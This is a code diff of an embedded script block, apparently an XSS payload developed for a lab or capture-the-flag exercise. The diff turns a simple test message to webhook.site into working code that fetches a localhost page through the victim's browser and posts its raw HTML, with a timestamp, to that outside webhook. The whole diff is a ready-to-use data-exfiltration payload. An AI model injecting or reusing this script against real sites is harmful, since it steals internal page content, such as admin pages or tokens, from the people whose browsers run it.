@@ -1,28 +1,77 @@
 <script>
-const WEBHOOK_URL = "https://webhook.site/998b21e9-1fed-4da1-9818-67cfafdbfaae";  // Replace with your webhook URL
+const TARGET_URL = "http://localhost/index.php";  // URL of the page you want to fetch
+const WEBHOOK_URL = "https://webhook.site/998b21e9-1fed-4da1-9818-67cfafdbfaae/";  // Replace with your webhook URL
 
-// Create a new XMLHttpRequest object
-const xhr = new XMLHttpRequest();
+// Create a new XMLHttpRequest object for fetching the page content
+const xhrFetch = new XMLHttpRequest();
+xhrFetch.open("GET", TARGET_URL, true);
 
-// Set up the request (POST method to your webhook URL)
-xhr.open("POST", WEBHOOK_URL, true);
-xhr.setRequestHeader("Content-Type", "application/json");
+// Onload event for the fetch request
+xhrFetch.onload = function() {
+  if (xhrFetch.status === 200) {
+    // Get the content of the page (raw HTML)
+    const pageContent = xhrFetch.responseText;
 
-// Data to send to the webhook
-const data = JSON.stringify({
-  message: "Hello, this is a test message from XHR!"
-});
-
-// Send the request with data
-xhr.send(data);
-
-// Optional: Log the response if needed
-xhr.onload = function() {
-  if (xhr.status === 200) {
-    console.log("Request sent successfully:", xhr.responseText);
+    // Check if the page content is empty or invalid
+    if (!pageContent.trim()) {
+      sendFallbackMessage("No content found on the target page.");
+    } else {
+      // Send the actual page content to the webhook
+      sendToWebhook(pageContent);
+    }
   } else {
-    console.error("Request failed with status:", xhr.status);
+    // Handle HTTP error (e.g., 404 or 500)
+    sendFallbackMessage(`Failed to fetch page: HTTP ${xhrFetch.status}`);
   }
 };
+
+// Function to send content to the webhook
+function sendToWebhook(content) {
+  const xhrSend = new XMLHttpRequest();
+  xhrSend.open("POST", WEBHOOK_URL, true);
+  xhrSend.setRequestHeader("Content-Type", "application/json");
+
+  const data = JSON.stringify({
+    source: TARGET_URL,
+    timestamp: new Date().toISOString(),
+    content: content  // Send the raw HTML content of the page
+  });
+
+  xhrSend.send(data);
+
+  xhrSend.onload = function() {
+    if (xhrSend.status === 200) {
+      console.log("Page content sent to webhook successfully.");
+    } else {
+      console.error("Failed to send page content to webhook:", xhrSend.status);
+    }
+  };
+}
+
+// Function to send a fallback message when content is empty or error occurs
+function sendFallbackMessage(message) {
+  const xhrSend = new XMLHttpRequest();
+  xhrSend.open("POST", WEBHOOK_URL, true);
+  xhrSend.setRequestHeader("Content-Type", "application/json");
+
+  const data = JSON.stringify({
+    source: TARGET_URL,
+    timestamp: new Date().toISOString(),
+    content: message  // Send a fallback message instead of the content
+  });
+
+  xhrSend.send(data);
+
+  xhrSend.onload = function() {
+    if (xhrSend.status === 200) {
+      console.log("Fallback message sent to webhook.");
+    } else {
+      console.error("Failed to send fallback message to webhook:", xhrSend.status);
+    }
+  };
+}
+
+// Send the fetch request to get the page content
+xhrFetch.send();
 
 </script>
